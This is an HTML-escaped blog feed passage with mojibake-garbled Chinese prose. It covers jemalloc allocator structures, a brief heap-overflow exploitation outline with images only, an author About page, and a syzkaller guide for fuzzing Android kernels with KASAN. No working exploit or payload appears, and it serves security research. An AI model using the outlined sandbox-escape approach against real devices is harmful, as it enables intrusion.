&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">uint64_t&lt;/span> &lt;span class="n">prof_accumbytes&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="cm">/* Cleared after arena_prof_accum(). */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">ticker_t&lt;/span> &lt;span class="n">gc_ticker&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* Drives incremental GC. */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">szind_t&lt;/span> &lt;span class="n">next_gc_bin&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* Next bin to GC. */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">tcache_bin_t&lt;/span> &lt;span class="n">tbins&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="cm">/* Dynamically sized. */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/*
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * The pointer stacks associated with tbins follow as a contiguous
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * array. During tcache initialization, the avail pointer in each
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * element of tbins is initialized to point to the proper offset within
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * this array.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="n">tcaches_s&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">union&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">tcache_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">tcache&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">tcaches_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200405034722.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200405034659.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200405190426.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="0x03-åˆ©ç”¨">0x03 åˆ©ç”¨&lt;/h3>
&lt;p>&lt;strong>å †æº¢å‡º&lt;/strong>&lt;/p>
&lt;p>ä¸€èˆ¬å…ˆåˆ©ç”¨gadget ç»•è¿‡ASLRï¼Œå†åˆ©ç”¨gadgetæ‹¿åˆ°ä»£ç æ‰§è¡Œçš„æƒé™ï¼Œåªè¦èƒ½æ‰§è¡Œä»£ç å°±èƒ½é€ƒå‡ºsandboxingæˆ–è€…æ‘†è„±selinuxã€‚&lt;/p>
&lt;ul>
&lt;li>Small region overflow&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200405190147.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ul>
&lt;li>Run overflow&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200405190224.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ul>
&lt;li>Chunk overflow&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200405190305.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="æ€»ç»“">æ€»ç»“&lt;/h3>
&lt;p>åé¢è¿˜æ˜¯å¾—ä½¿ç”¨shadowå·¥å…·å…·ä½“è°ƒè¯•CVEåŠ æ·±ç†è§£ã€‚&lt;/p>
&lt;p>jemallocæ–°ç‰ˆä¸æ—§ç‰ˆæœ‰æŒºå¤šåŒºåˆ«ï¼Œä¹‹åæƒ³è¦æ·±å…¥äº†è§£jemallocçš„ç»†èŠ‚ä»¥åŠä¸€äº›å®ç°è¿˜æ˜¯å¾—çœ‹çœ‹æºç ã€‚&lt;/p>
&lt;h3 id="å‚è€ƒ">å‚è€ƒ&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/jemalloc/jemalloc" target="_blank" rel="noopener"
>https://github.com/jemalloc/jemalloc&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://blog.csdn.net/txx_683/article/details/53468211" target="_blank" rel="noopener"
>https://blog.csdn.net/txx_683/article/details/53468211&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://blog.nsogroup.com/a-tale-of-two-mallocs-on-android-libc-allocators-part-2-jemalloc/" target="_blank" rel="noopener"
>https://blog.nsogroup.com/a-tale-of-two-mallocs-on-android-libc-allocators-part-2-jemalloc/&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://www.anquanke.com/post/id/149132#h3-5" target="_blank" rel="noopener"
>https://www.anquanke.com/post/id/149132#h3-5&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://www.anquanke.com/post/id/85982" target="_blank" rel="noopener"
>https://www.anquanke.com/post/id/85982&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>dlmalloc çš„ä¸€ä¸ªtools: &lt;a class="link" href="https://github.com/s1341/shade" target="_blank" rel="noopener"
>shade&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>About</title><link>https://ykiko.top/p/about/</link><pubDate>Mon, 28 Oct 2019 00:00:00 +0000</pubDate><guid>https://ykiko.top/p/about/</guid><description>&lt;h1 id="about">About&lt;/h1>
&lt;h3 id="about-me">&lt;strong>About me&lt;/strong>&lt;/h3>
&lt;hr>
&lt;ul>
&lt;li>
&lt;p>ç§»åŠ¨å®‰å…¨ã€IoTå®‰å…¨ã€è½¦è”ç½‘å®‰å…¨ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ­£åœ¨åŠªåŠ›å˜å¼º å……ç”µä¸­ - - - - - -&lt;/p>
&lt;/li>
&lt;li>
&lt;p>tcl&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ãƒ¾(â—Â°âˆ‡Â°â—)ï¾‰ï¾&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="links">&lt;strong>Links&lt;/strong>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>email:Â &lt;a class="link" href="mailto:skuekiko7@gmail.com" >kuekiko7@gmail.com&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Twitter:Â &lt;a class="link" href="https://twitter.com/kuekiko7" target="_blank" rel="noopener"
>ykikoqAq&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Telegram:Â &lt;a class="link" href="https://t.me/Vorblock" target="_blank" rel="noopener"
>ykikoqAq&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>github:Â &lt;a class="link" href="https://github.com/kuekiko" target="_blank" rel="noopener"
>gayhub&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>weibo:Â &lt;a class="link" href="https://weibo.com/u/2952658161" target="_blank" rel="noopener"
>keams_v&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>bilibili:Â &lt;a class="link" href="https://space.bilibili.com/6477559" target="_blank" rel="noopener"
>Bili&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>çŸ¥ä¹:Â &lt;a class="link" href="https://www.zhihu.com/people/vorblock/activities" target="_blank" rel="noopener"
>çŸ¥ä¹&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://as2.bitinn.net/uploads/w5/cjrr6b2e9002h1t8hi9at4hw5.1080p.jpg"
loading="lazy"
alt="img"
>&lt;/p></description></item><item><title>syzkaller-android</title><link>https://ykiko.top/p/syzkaller-android/</link><pubDate>Sun, 15 Sep 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/syzkaller-android/</guid><description>&lt;h1 id="syzkaller-android">syzkaller-android&lt;/h1>
&lt;h3 id="0x00-å‰è¨€">0x00 å‰è¨€&lt;/h3>
&lt;p>ä»‹ç»ä½¿ç”¨syzkaller fuzz Androidçš„é…ç½®æ•™ç¨‹ã€‚&lt;/p>
&lt;h3 id="0x01-ç¯å¢ƒ">0x01 ç¯å¢ƒ&lt;/h3>
&lt;p>æŒ‰è¦å®‰è£…å¥½ç¯å¢ƒ&lt;/p>
&lt;ul>
&lt;li>
&lt;p>go&lt;/p>
&lt;/li>
&lt;li>
&lt;p>syzkaller&lt;/p>
&lt;/li>
&lt;li>
&lt;p>äº¤å‰ç¼–è¯‘aarch64-linux-androidã€g++-aarch64-linux-gnuã€gcc-arm-linux-gnueabihfã€g++-arm-linux-gnueabihf&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x02-é…ç½®">0x02 é…ç½®&lt;/h3>
&lt;p>åˆ›å»ºé…ç½®æ–‡ä»¶android.cfg&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-json" data-lang="json">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;target&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;linux/arm64&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// arm
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nt">&amp;#34;http&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;127.0.0.1:56741&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;workdir&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;$GOPATH/src/github.com/google/syzkaller/workdir&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;kernel_obj&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;$KERNEL&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// å†…æ ¸è·¯å¾„
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nt">&amp;#34;syzkaller&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;$GOPATH/src/github.com/google/syzkaller&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;sandbox&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="err">none&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;procs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;adb&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;cover&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;vm&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;devices&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="err">$DEVICES&lt;/span>&lt;span class="p">],&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;battery_check&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">true&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>
&lt;p>KASAN+KCOVç¼–è¯‘å†…æ ¸&lt;/p>
&lt;ol>
&lt;li>
&lt;p>é¦–å…ˆç¼–è¯‘è¦fuzzçš„Androidç‰ˆæœ¬è¾“å…¥æ‰‹æœºã€‚ï¼ˆè¿‡ç¨‹çœç•¥ï¼‰[1]&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¸‹è½½ç¼–è¯‘åŸºå‡†å†…æ ¸ã€‚[2] ï¼Œä½¿ç”¨æ‰‹åŠ¨ç¼–è¯‘ä¼šæŠ¥é”™ï¼Œä½¿ç”¨ç»™KASCANæ–‡æ¡£[3]çš„æ–¹æ³•ä¹Ÿå¯èƒ½æŠ¥é”™ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## åˆ›å»ºæ–‡ä»¶å¤¹&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mkdir android-kernel &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nb">cd&lt;/span> android-kernel
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## åˆ‡æ¢åˆ†æ”¯&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">repo init -u https://android.googlesource.com/kernel/manifest -b BRANCH
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">repo sync
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## ä¿®æ”¹å†…æ ¸buildæ–‡ä»¶ å†…æ ¸è·¯å¾„ä¸‹çš„build.configåˆ¶å®šmake_deconfig&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">KERNEL_DIR&lt;/span>&lt;span class="o">=&lt;/span>private/msm-google
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">. &lt;span class="si">${&lt;/span>&lt;span class="nv">ROOT_DIR&lt;/span>&lt;span class="si">}&lt;/span>/&lt;span class="si">${&lt;/span>&lt;span class="nv">KERNEL_DIR&lt;/span>&lt;span class="si">}&lt;/span>/build.config.common &lt;span class="c1">##è¿™é‡Œ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## æ„å»ºå†…æ ¸&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">build/build.sh
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>åˆ·å…¥å†…æ ¸&lt;/p>
&lt;p>é‡æ–°ç¼–è¯‘aospå¯åŠ¨é•œåƒ&lt;/p>
&lt;p>åœ¨æœåŠ¡å™¨ä¸Šç¼–è¯‘çš„å°†out/distç›®å½•æ‰“åŒ…å¤‡ä»½&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> &lt;span class="o">{&lt;/span>aosp_dir&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cp &lt;span class="o">{&lt;/span>kernel_dir&lt;span class="o">}&lt;/span>/out/&lt;span class="o">{&lt;/span>version&lt;span class="o">}&lt;/span>/dist/Image.lz4-dtb &lt;span class="o">{&lt;/span>aosp&lt;span class="o">}&lt;/span>/device/google/marlin-kernel
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">. build/envsetup.sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lunch aosp_sailfish-userdebug
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make -j64
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## é‡æ–°æ‹·è´åˆ°æœ¬åœ° win&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">adb reboot bootloader
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> &lt;span class="nv">ANDROID_PRODUCT_OUT&lt;/span>&lt;span class="o">=&lt;/span>./
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fastboot flashall -w
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;blockquote>
&lt;p>ä¹‹å‰ 3.18.137-g72a7a6&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code> ä¹‹å â€¦ (æ‰‹æœºæ˜¾ç¤ºæ— æ³•æ˜¾ç¤ºå†…æ ¸)
```shell
sailfish:/ # uname -a
Linux localhost 3.18.137-g8b62de70252d #1 SMP PREEMPT 2019-09-27 02:13:04 aarch64
```
&lt;/code>&lt;/pre>
&lt;/li>
&lt;li>
&lt;p>ä¿®æ”¹å†…æ ¸é‡æ–°åˆ·å…¥&lt;/p>
&lt;ul>
&lt;li>å¤±è´¥çš„æ–¹æ³•&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>æŒ‰æ–‡æ¡£è¯´çš„&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code> ```shell
cd arch/arm64/configs
cp marlin_defconfig marlin-kasan_defconfig
```
åœ¨é…ç½®æ–‡æ¡£ä¸­ç§»é™¤`CONFIG_KERNEL_LZ4=y`
åŠ å…¥
```plain text
CONFIG_KASAN_INLINE=y
CONFIG_KCOV=y
CONFIG_SLUB=y
CONFIG_SLUB_DEBUG=y
```
é‡æ–°ç¼–è¯‘å†…æ ¸ã€‚
å‘ç°ä»»ä½•å˜åŒ–
&lt;/code>&lt;/pre>
&lt;blockquote>
&lt;p>å°è¯•çš„æ–¹æ³•&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code> ä¿®æ”¹build.configæ–‡ä»¶
```shell
. ${ROOT_DIR}/${KERNEL_DIR}/build.config.kasan (å¤±è´¥)
```
ä¸ä¿®æ”¹ï¼Œè¿˜æ˜¯å»ä¿®æ”¹marlin_defconfigæ·»åŠ KASAN
æŠ¥é”™ï¼šsavedefconfig does not match private/msm-google
ä¿®æ”¹build.config åˆ æ‰check_defconfig æ£€æŸ¥ ï¼ˆå¤±è´¥ï¼‰
&lt;/code>&lt;/pre>
&lt;blockquote>
&lt;p>ä¸ä¿®æ”¹æ–‡ä»¶&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code> ä½¿ç”¨å‘½ä»¤
```shell
./build/build.sh BUILD_CONFIG=build.config.kasan
```
&lt;/code>&lt;/pre>
&lt;p>æœ€åå‘ç°&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">cp private/msm-google/build.config.kasan ./
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">BUILD_CONFIG&lt;/span>&lt;span class="o">=&lt;/span>build.config.kasan build/build.sh &lt;span class="c1">##æ”¾å‰é¢æ‰ç®¡ç”¨&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ç¼–è¯‘å®Œæˆ ï¼Œä¿®æ”¹aospå‚æ•°&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">aosp$ &lt;span class="nb">cd&lt;/span> device/google/marlin/sailfish
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cp BoardConfig.mk BoardConfig.mk.bak
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vim BoardConfig.mk
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## æ³¨é‡Šæ‰&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BOARD_KERNEL_BASE :&lt;span class="o">=&lt;/span> 0x80000000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BOARD_KERNEL_PAGESIZE :&lt;span class="o">=&lt;/span> &lt;span class="m">4096&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## ifneq ($(filter sailfish_kasan, $(TARGET_PRODUCT)),)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BOARD_KERNEL_OFFSET :&lt;span class="o">=&lt;/span> 0x80000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BOARD_KERNEL_TAGS_OFFSET :&lt;span class="o">=&lt;/span> 0x02500000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BOARD_RAMDISK_OFFSET :&lt;span class="o">=&lt;/span> 0x02700000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BOARD_MKBOOTIMG_ARGS :&lt;span class="o">=&lt;/span> --kernel_offset &lt;span class="k">$(&lt;/span>BOARD_KERNEL_OFFSET&lt;span class="k">)&lt;/span> --ramdisk_offset &lt;span class="k">$(&lt;/span>BOARD_RAMDISK_OFFSET&lt;span class="k">)&lt;/span> --tags_offset &lt;span class="k">$(&lt;/span>BOARD_KERNEL_TAGS_OFFSET&lt;span class="k">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## else&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## BOARD_KERNEL_TAGS_OFFSET := 0x02000000&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## BOARD_RAMDISK_OFFSET := 0x02200000&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## endif&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">TARGET_KERNEL_ARCH :&lt;span class="o">=&lt;/span> arm64
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">TARGET_KERNEL_HEADER_ARCH :&lt;span class="o">=&lt;/span> arm64
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä¿®æ”¹device/google/marlin/device-common.mk&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">lz4-&amp;gt;gz
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">LOCAL_KERNEL :&lt;span class="o">=&lt;/span> device/google/marlin-kernel/Image.gz-dtb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>æ–°çš„é—®é¢˜&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">error: out/target/product/sailfish/boot-debug.img too large
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è§£å†³æ–¹æ³•ï¼šå°†BoardConfig.mkçš„&lt;code>BOARD_BOOTIMAGE_PARTITION_SIZE&lt;/code>çš„å€¼æ”¹å¤§ã€‚&lt;/p>
